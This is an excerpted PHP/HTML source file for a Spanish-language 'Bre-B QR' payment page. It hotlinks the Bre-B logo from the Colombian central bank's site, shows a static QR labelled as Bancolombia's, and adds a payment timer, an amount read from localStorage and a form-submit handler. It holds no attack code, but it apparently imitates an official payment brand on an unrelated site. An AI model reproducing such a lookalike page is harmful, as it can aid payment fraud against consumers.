...
$canonical = jelpi_canonical_url('/act-jelpi/brev.php');
...
<head>
    ...
    <title>Pasarela de Pago Bre-B QR</title>
    <style>
        /* =========================================
        ...
        * {
        ...
        .alert-content h4 { font-size: 14px; font-weight: 700; margin-bottom: 4px; color: #1a6e7a; }
        .alert-content p { font-size: 13px; color: #1a6e7a; line-height: 1.4; }
        ...
        .step-number { 
            width: 24px; height: 24px; background: linear-gradient(135deg, var(--breb-cyan), var(--breb-green));
            border-radius: 50%; display: flex; align-items: center; justify-content: center; 
            font-size: 13px; font-weight: 700; flex-shrink: 0; color: var(--breb-primary);
        }
        ...
        .qr-frame::before, .qr-frame::after, .qr-frame-inner::before, .qr-frame-inner::after { 
            content: ''; position: absolute; width: 20px; height: 20px; border-color: var(--breb-cyan); border-style: solid; 
        }
        ...
        .timer-content h4 span { color: var(--breb-primary); }
        ...
        .btn-yellow { background: linear-gradient(135deg, var(--breb-cyan), var(--breb-green)); color: var(--breb-primary); }
...
<body>
    ...
    <div class="main-container">
        ...
        <div class="col-left">
            <div class="header item-header">
                <img src="https://www.banrep.gov.co/sites/default/files/inline-images/bre-b-minisite.jpg" alt="Logo Bre-B" class="main-logo">
            ...
            <div class="title-section item-title">
                <h2>Paga rápido con tu llave Bre-B</h2>
                <p>Escanea el código QR desde tu app bancaria y confirma el pago en segundos con Bre-B.</p>
            </div>

            <div class="alert-box item-alert">
                <svg class="alert-icon-svg" viewBox="0 0 24 24" fill="#00D4C8">
                  <path d="M12 2L2 19h20L12 2z"/>
                  <circle cx="12" cy="16" r="1.5" fill="#fff"/>
                  <path d="M11 8h2v5h-2z" fill="#fff"/>
                </svg>
                <div class="alert-content">
                    <h4>Pago inmediato con Bre-B</h4>
                    <p>Usa tu llave Bre-B para realizar pagos instantáneos. Escanea el QR o ingresa la llave directamente en tu app bancaria.</p>
                </div>
            </div>
            ...
            <div class="instructions item-instructions">
                <div class="instruction-step">
                    ...
                    <p>Abre tu app bancaria con <b>Bre-B</b> habilitado</p>
                </div>
                <div class="instruction-step">
                    <div class="step-number">2</div>
                    <p>Toca <b>"Pagar con QR"</b> o ingresa la llave</p>
                </div>
                <div class="instruction-step">
        ...
        <div class="col-right">
            ...
            <div class="qr-section item-qr">
                <div class="qr-frame">
                    <div class="qr-frame-inner">
                        <img src="qr.jpg?v=1785353159" alt="Código QR Bancolombia" class="qr-image">
                    </div>
                </div>
            </div>
            ...
            <div class="amount-box item-amount">
                ...
                <div class="amount-value" id="fin-total">$ 0</div>
            ...
            <div class="timer-box item-timer">
                <div class="timer-icon">
                    <svg class="timer-icon-svg" viewBox="0 0 24 24">
                      <circle cx="12" cy="12" r="10" stroke="#00D4C8" stroke-width="2" fill="none"/>
                      <polyline points="12 6 12 12 16 14" stroke="#2D165E" stroke-width="2" fill="none"/>
                    </svg>
                </div>
    ...
    <script>
        ...
        (function() {
            ...
            if (el && total) {
                el.innerText = '$' + Number(total).toLocaleString('es-CO', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
            }
        })();
        ...
        // ==========================================
        // 0. Al presionar Descargar QR
        btnDescargar.addEventListener('click', () => {
            const enlace = document.createElement('a');
            enlace.href = 'qr.jpg?v=1785353159';
            enlace.download = 'Codigo_QR_BreB.jpg';
        ...
        btnEnviar.addEventListener('click', async () => {
            ...
            formData.append('total_pagar', localStorage.getItem('total_pagar') || '0');
